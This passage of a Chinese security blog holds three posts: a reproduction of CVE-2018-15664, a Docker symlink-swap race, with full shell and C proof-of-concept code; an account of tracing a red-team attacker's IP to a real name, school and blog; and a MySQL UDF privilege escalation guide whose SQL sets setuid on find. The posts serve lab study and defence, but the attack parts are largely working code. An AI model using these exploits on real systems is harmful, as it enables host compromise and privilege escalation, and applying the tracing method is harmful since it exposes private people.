image.</span></span><br><span class="line">docker build -t cyphar/symlink_swap \</span><br><span class="line">	--build-arg <span class="string">&quot;SYMSWAP_PATH=<span class="variable">$SYMSWAP_PATH</span>&quot;</span> \</span><br><span class="line">	--build-arg <span class="string">&quot;SYMSWAP_TARGET=<span class="variable">$SYMSWAP_TARGET</span>&quot;</span> build/</span><br><span class="line">ctr_id=$(docker run --<span class="built_in">rm</span> -d cyphar/symlink_swap <span class="string">&quot;<span class="variable">$SYMSWAP_PATH</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Now continually try to copy the files.</span></span><br><span class="line">idx=0</span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">mkdir</span> <span class="string">&quot;ex<span class="variable">$&#123;idx&#125;</span>&quot;</span></span><br><span class="line">	docker <span class="built_in">cp</span> <span class="string">&quot;<span class="variable">$&#123;ctr_id&#125;</span>:<span class="variable">$SYMSWAP_PATH</span>/<span class="variable">$SYMSWAP_TARGET</span>&quot;</span> <span class="string">&quot;ex<span class="variable">$&#123;idx&#125;</span>/out&quot;</span></span><br><span class="line">	idx=$((<span class="variable">$idx</span> + <span class="number">1</span>))</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h3 id="漏洞场景：受害者在从宿主机中复制文件到容器中"><a href="#漏洞场景：受害者在从宿主机中复制文件到容器中" class="headerlink" title="漏洞场景：受害者在从宿主机中复制文件到容器中"></a>漏洞场景：受害者在从宿主机中复制文件到容器中</h3><p>当漏洞触发时宿主机内的文件将被复制到宿主机中的任意一个目录（容器中恶意符号链接所指定）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/zsh</span></span><br><span class="line"><span class="comment"># Copyright (C) 2018 Aleksa Sarai &lt;asarai@suse.de&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This program is free software: you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment"># it under the terms of the GNU General Public License as published by</span></span><br><span class="line"><span class="comment"># the Free Software Foundation, either version 3 of the License, or</span></span><br><span class="line"><span class="comment"># (at your option) any later version.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment"># but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment"># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment"># GNU General Public License for more details.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># You should have received a copy of the GNU General Public License</span></span><br><span class="line"><span class="comment"># along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span></span><br><span class="line"></span><br><span class="line">SYMSWAP_PATH=/totally_safe_path</span><br><span class="line">SYMSWAP_TARGET=/w00t_w00t_im_a_flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create our flag.</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;FAILED -- HOST FILE UNCHANGED&quot;</span> | sudo <span class="built_in">tee</span> <span class="string">&quot;<span class="variable">$SYMSWAP_TARGET</span>&quot;</span></span><br><span class="line">sudo <span class="built_in">chmod</span> 0444 <span class="string">&quot;<span class="variable">$SYMSWAP_TARGET</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Run and build the malicious image.</span></span><br><span class="line">docker build -t cyphar/symlink_swap \</span><br><span class="line">	--build-arg <span class="string">&quot;SYMSWAP_PATH=<span class="variable">$SYMSWAP_PATH</span>&quot;</span> \</span><br><span class="line">	--build-arg <span class="string">&quot;SYMSWAP_TARGET=<span class="variable">$SYMSWAP_TARGET</span>&quot;</span> build/</span><br><span class="line">ctr_id=$(docker run --<span class="built_in">rm</span> -d cyphar/symlink_swap <span class="string">&quot;<span class="variable">$SYMSWAP_PATH</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;SUCCESS -- HOST FILE CHANGED&quot;</span> | <span class="built_in">tee</span> localpath</span><br><span class="line"></span><br><span class="line"><span class="comment"># Now continually try to copy the files.</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	docker <span class="built_in">cp</span> localpath <span class="string">&quot;<span class="variable">$&#123;ctr_id&#125;</span>:<span class="variable">$SYMSWAP_PATH</span>/<span class="variable">$SYMSWAP_TARGET</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h3 id="POC解读"><a href="#POC解读" class="headerlink" title="POC解读"></a>POC解读</h3><p>POC中使用一个无限循环将恶意符号链接与正常文件交换，根据目标文件内容可以判定我们是否竞争成功。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (C) 2018 Aleksa Sarai &lt;asarai@suse.de&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This program is free software: you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment"> * it under the terms of the GNU General Public License as published by</span></span><br><span class="line"><span class="comment"> * the Free Software Foundation, either version 3 of the License, or</span></span><br><span class="line"><span class="comment"> * (at your option) any later version.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment"> * but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment"> * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment"> * GNU General Public License for more details.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * You should have received a copy of the GNU General Public License</span></span><br><span class="line"><span class="comment"> * along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> usage() \</span></span><br><span class="line"><span class="meta">	do &#123; printf(<span class="string">&quot;usage: symlink_swap &lt;symlink&gt;\n&quot;</span>); exit(1); &#125; while(0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bail(msg) \</span></span><br><span class="line"><span class="meta">	do &#123; perror(<span class="string">&quot;symlink_swap: &quot;</span> msg); exit(1); &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* No glibc wrapper for this, so wrap it ourselves. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RENAME_EXCHANGE (1 &lt;&lt; 1)</span></span><br><span class="line"><span class="comment">/*int renameat2(int olddirfd, const char *oldpath,</span></span><br><span class="line"><span class="comment">              int newdirfd, const char *newpath, int flags)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	return syscall(__NR_renameat2, olddirfd, oldpath, newdirfd, newpath, flags);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* usage: symlink_swap &lt;symlink&gt; */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">		usage();</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> *symlink_path = argv[<span class="number">1</span>];</span><br><span class="line">	<span class="type">char</span> *stash_path = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (asprintf(&amp;stash_path, <span class="string">&quot;%s-stashed&quot;</span>, symlink_path) &lt; <span class="number">0</span>)</span><br><span class="line">		bail(<span class="string">&quot;create stash_path&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Create a dummy file at symlink_path. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">sb</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">if</span> (!lstat(symlink_path, &amp;sb)) &#123;</span><br><span class="line">		<span class="type">int</span> err;</span><br><span class="line">		<span class="keyword">if</span> (sb.st_mode &amp; S_IFDIR)</span><br><span class="line">			err = rmdir(symlink_path);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			err = unlink(symlink_path);</span><br><span class="line">		<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">			bail(<span class="string">&quot;unlink symlink_path&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Now create a symlink to &quot;/&quot; (which will resolve to the host&#x27;s root if we</span></span><br><span class="line"><span class="comment">	 * win the race) and a dummy directory at stash_path for us to swap with.</span></span><br><span class="line"><span class="comment">	 * We use a directory to remove the possibility of ENOTDIR which reduces</span></span><br><span class="line"><span class="comment">	 * the chance of us winning.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (symlink(<span class="string">&quot;/&quot;</span>, symlink_path) &lt; <span class="number">0</span>)</span><br><span class="line">		bail(<span class="string">&quot;create symlink_path&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (mkdir(stash_path, <span class="number">0755</span>) &lt; <span class="number">0</span>)</span><br><span class="line">		bail(<span class="string">&quot;mkdir stash_path&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Now we do a RENAME_EXCHANGE forever. */</span></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="type">int</span> err = renameat2(AT_FDCWD, symlink_path,</span><br><span class="line">	                        AT_FDCWD, stash_path, RENAME_EXCHANGE);</span><br><span class="line">		<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">			perror(<span class="string">&quot;symlink_swap: rename exchange failed&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里使用metarget靶场进行漏洞测试。</p>
<h3 id="正常操作"><a href="#正常操作" class="headerlink" title="正常操作"></a>正常操作</h3><p>将容器中的文件ex复制到宿主机中，FollowSymlinkInScope方法检查这个路径合法，evalSymlinksInScope方法对这个路径进行解析。执行的结果是将容器中的ex复制到宿主机的当前目录下。</p>
<h3 id="恶意操作"><a href="#恶意操作" class="headerlink" title="恶意操作"></a>恶意操作</h3><p>将容器中的文件ex复制到宿主机中，FollowSymlinkInScope方法检查这个路径合法，在evalSymlinksInScope方法对这个路径进行解析之前将路径替换为恶意符号链接指向宿主机的&#x2F;w00t_w00t_im_a_flag。执行的结果是将&#x2F;w00t_w00t_im_a_flag文件复制到宿主机当前目录下。</p>
<p>运行run_read.sh，并通过grep查看是否写入成功。</p>
<p>非常夸张的是在竞争中获得root的主机访问权限&lt;1%,但仍有机会竞争成功。</p>
<p><img src="https://merk11-cnblog.oss-cn-beijing.aliyuncs.com/blogimg/image-20230912212957974.png" alt="image-20230912212957974"></p>
<h3 id="正常操作-1"><a href="#正常操作-1" class="headerlink" title="正常操作"></a>正常操作</h3><p>要将宿主机的正常文件localpath复制到容器中，FollowSymlinkInScope方法检查这个路径合法，evalSymlinksInScope方法对这个路径进行解析。执行的结果是将宿主机的当前目录的localpath复制到容器中的&#x2F;w00t_w00t_im_a_flag位置。</p>
<h3 id="恶意操作-1"><a href="#恶意操作-1" class="headerlink" title="恶意操作"></a>恶意操作</h3><p>我们在容器中创建了一个指向宿主机根目录&#x2F;的恶意符号链接，在进行FollowSymlinkInScope方法时，对正常文件localpath进行检查，但在evalSymlinksInScope方法中传入的路径为指向宿主机根目录&#x2F;的恶意符号链接。执行的结果是将宿主机的当前目录的localpath复制到宿主机&#x2F;w00t_w00t_im_a_flag位置。</p>
<p>运行run_write.sh</p>
<p>我们发现这很快就完成了竞争，</p>
<p>这是因为 Docker 内部有一个**”chrootarchive”概念**，其中存档是从 chroot 中提取的。然而，Docker 不会 chroot 到容器的”&#x2F;“（这会使此漏洞无效），而是 chroot 到存档目标的父目录——这是攻击者控制的。结果，这实际上导致攻击更有可能成功（一旦 chroot 完成竞争，其余的攻击就保证成功）。</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20230912170647623.png" alt="image-20230912170647623"></p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20230912170658008.png" alt="image-20230912170658008"></p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272962.htm">CVE-2018-15664：符号链接替换漏洞</a></p>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-09-12</span><i class="fa fa-tag"></i><a class="tag" href="/tags/容器安全/" title="容器安全">容器安全 </a><span class="leancloud_visitors"></span><span>大约2794个字, 9分钟18秒读完</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/09/02/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E7%9C%9F%E5%AE%9E%E6%BA%AF%E6%BA%90%E7%BB%8F%E5%8E%86/">记录一次真实溯源经历</a></h3></div><div class="post-content"><div class="card"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-Sally-blue.svg" alt="img"></a></p>
<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在一次针对XX类型单位的攻防演练中，本人作为蓝队值守<strong>应领导要求</strong>对某个攻击IP进行溯源。</p>
<h2 id="溯源过程"><a href="#溯源过程" class="headerlink" title="溯源过程"></a>溯源过程</h2><ol>
<li><p>IP查询</p>
<p>站长之家查询是<strong>上海腾讯云的IP</strong></p>
<p><img src="https://merk11-cnblog.oss-cn-beijing.aliyuncs.com/blogimg/image-20230902101955257.png" alt="image-20230902101955257"></p>
<p>由于是腾讯云我采用忘记账号的方式查询电话辅助信息，可以获得<strong>脱敏的手机号</strong></p>
<p><img src="https://merk11-cnblog.oss-cn-beijing.aliyuncs.com/blogimg/image-20230902102155888.png" alt="image-20230902102155888"></p>
</li>
<li><p>域名解析记录查询</p>
<p>通过360安全大脑可以查询出该IP曾解析过一个个人域名xxx.top</p>
<p><img src="https://merk11-cnblog.oss-cn-beijing.aliyuncs.com/blogimg/image-20230902101543597.png" alt="image-20230902101543597"></p>
<p>xxx.top还未过期，可以猜测该IP临时改绑了</p>
<p><img src="https://merk11-cnblog.oss-cn-beijing.aliyuncs.com/blogimg/image-20230902102439711.png" alt="image-20230902102439711"></p>
</li>
<li><p>ICP备案信息泄露</p>
<p>通过微步对该IP归属单位进行查询，发现他并没有对自己的信息隐私化，可以查到<strong>归属人姓名</strong></p>
<p><img src="https://merk11-cnblog.oss-cn-beijing.aliyuncs.com/blogimg/%E5%9B%BE%E7%89%871.png" alt="图片1"></p>
</li>
<li><p>网络查询（博客、学校）</p>
<p>通过百度搜索该域名可以查询到网页中包含该域名网站，于是查询到了<strong>归属人的博客园</strong>，通过博客园可以获得<strong>归属人的网名xxx</strong></p>
<p><img src="https://merk11-cnblog.oss-cn-beijing.aliyuncs.com/blogimg/%E5%9B%BE%E7%89%872.png" alt="图片2"></p>
<p>根据网名和归属人姓名可以查询到<strong>学校和相关奖项</strong></p>
<p><img src="https://merk11-cnblog.oss-cn-beijing.aliyuncs.com/blogimg/%E5%9B%BE%E7%89%873.png" alt="图片3"></p>
<p><img src="https://merk11-cnblog.oss-cn-beijing.aliyuncs.com/blogimg/image-20230902103517284.png" alt="image-20230902103517284"></p>
</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上述溯源过程纯属运气，由于攻击队某个成员没有将自己的IP曾经绑定的个人站中的备案信息隐私化，从而得以让我们查找到真实姓名，进行溯源反查。</p>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-09-02</span><i class="fa fa-tag"></i><a class="tag" href="/tags/应急响应/" title="应急响应">应急响应 </a><span class="leancloud_visitors"></span><span>大约355个字, 1分钟11秒读完</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/06/14/UDF%E6%8F%90%E6%9D%83/">UDF提取</a></h3></div><div class="post-content"><div class="card"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-Sally-blue.svg"></a></p>
<p>参考文章：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43430261/article/details/107258466">https://blog.csdn.net/qq_43430261/article/details/107258466</a></p>
<h2 id="UDF路径"><a href="#UDF路径" class="headerlink" title="UDF路径"></a>UDF路径</h2><p>默认在MySQL根目录下的<code>/lib/plugin</code></p>
<p>也可以通过<code>select @@basedir</code>查看根目录</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>通过引入<code>udf.dll</code>来创建自定义函数，下面语句的含义是定义了<code>sys_eval</code>的函数，这个函数在<code>udf.dll</code>中有实现，通过引入这个函数来<strong>执行系统命令</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.dll&#x27;;</span><br></pre></td></tr></table></figure>

<h2 id="提权利用"><a href="#提权利用" class="headerlink" title="提权利用"></a>提权利用</h2><p>由于<code>sys_eval</code>函数是以管理员权限运行的，所以我们现在考虑如何将这个管理员权限转移给我们的shell</p>
<ol>
<li>将udf文件放到指定位置（Mysql&gt;5.1放在Mysql根目录的lib\plugin文件夹下）</li>
<li>从udf文件中引入自定义函数(user defined function)</li>
<li>执行自定义函数</li>
</ol>
<p>我们现在需要udf.dll，可以通过sqlmap进行获取，进入到<code>sqlmap\extra\cloak\cloak</code>目录执行下述命令，就会在指定的路径下生成动态链接库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloak.py -d -i D:\sqlmap\udf\mysql\windows\32\lib_mysqludf_sys.dll_</span><br></pre></td></tr></table></figure>

<p>接下来我们需要，授予特定可供命令执行的文件以管理员权限，于是我们可以将MySQL中的管理员权限转移出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p &#x27;R@v3nSecurity&#x27; # 进入mysql</span><br><span class="line">use mysql;   # 切换数据库</span><br><span class="line">create table foo (line blob); # 新建一个表，用来存放本地传来的udf文件的内容</span><br><span class="line">insert into foo values(load_file(&#x27;[udf路径]&#x27;)); # 在foo中写入udf文件内容</span><br><span class="line">select * from foo into dumpfile &#x27;[你要写入udf的路径]&#x27;;  # 将udf文件内容传入新建的udf文件中,这里的dumpfile要和用linEnum.sh查看的mysql的路径一致</span><br><span class="line"># windows中，对于mysql小于5.1的，导出目录为C:\Windows\或C:\Windows\System32\，linux中，5.1以上lib\plugin</span><br><span class="line">create function sys_eval returns integer soname &#x27;[你的udf名]&#x27;; # 导入udf函数</span><br><span class="line">select sys_eval(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line">create table foo(line blob);  </span><br><span class="line"># 给 find 命令加上 setuid 的标志，然后调用find的-exec指令来执行命令</span><br><span class="line">quit; # 退出mysql</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里补充了UDF提权方式，通过MySQL引入udf.dll并创建自定义命令执行函数，授予某个常用的命令以管理员权限，从而导致将MySQL中的权限转移出来造成提权</p>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-06-14</span><i class="fa fa-tag"></i><a class="tag" href="/tags/内网渗透/" title="内网渗透">内网渗透 </a><span class="leancloud_visitors"></span><span>大约587个字, 1分钟57秒读完</span></div></div></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/page/2/">下一页</a></li></ul></div></div></div></div><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"文章",PAGES:"页面",CATEGORIES:"分类",TAGS:"标签",UNTITLED:"(无标题)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="想要查找什么..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div><script src="/js/baidu-tongji.js"></script></body></html>